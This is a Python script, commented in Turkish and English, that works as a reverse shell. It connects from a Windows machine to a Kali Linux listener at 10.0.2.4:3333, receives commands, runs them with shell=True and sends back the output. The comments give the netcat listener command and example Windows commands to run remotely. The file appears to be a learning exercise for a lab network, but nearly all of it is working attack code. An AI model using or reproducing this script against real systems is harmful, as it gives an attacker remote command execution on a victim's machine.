import socket
import subprocess

# ilk etapda kali linux da terminalde alttaki komutu yazıp sonra bu app ı çalıştırmalısınız.
# nc -l -p PORT_NUMBER So Kali linux '10.0.2.4' 
# python dosyasını calıstırdıktan sonra kalı lınux a dönüp oradan windows terminal komutlarını yazabılırsınız.
# örnek olarak ' dir - ipconfig ' gibi

# target machine is kali linux and for controlling 
# type 'nc -l -p PORT_NUMBER' on terminal on kali linux 
# PORT_NUMBER is that we used 3333


def command_execution(command) :
	# run command with shell
	return subprocess.check_output(command, shell=True)

# socket.socket(1,2)
# 1. hangi ag ailesi ile calisilacak.
# 2. hangi yol ile veriler transfer edilecek.
my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

my_connection.connect(("10.0.2.4",3333))
# my_connection.send("connected OK for windows\n")

while True:
	# will be received '1024 byte' data 
	command = my_connection.recv(1024)
	command_output = command_execution(command)
	my_connection.send(command_output)


print("data is sent... ")
my_connection.close()